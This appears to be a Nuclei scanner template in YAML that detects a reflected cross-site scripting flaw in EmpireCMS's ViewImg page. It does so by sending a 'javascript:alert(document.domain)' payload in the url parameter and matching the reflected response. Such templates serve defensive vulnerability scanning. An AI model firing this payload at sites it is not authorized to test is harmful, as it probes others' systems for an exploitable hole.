http:
- matchers:
  - type: word
    words:
    - onmousewheel=\"return bbimg(this)\"
  - status:
    - 200
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/e/ViewImg/index.html?url=javascript:alert(document.domain)'
id: empirecms-xss
info:
  author: pikpikcu
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N
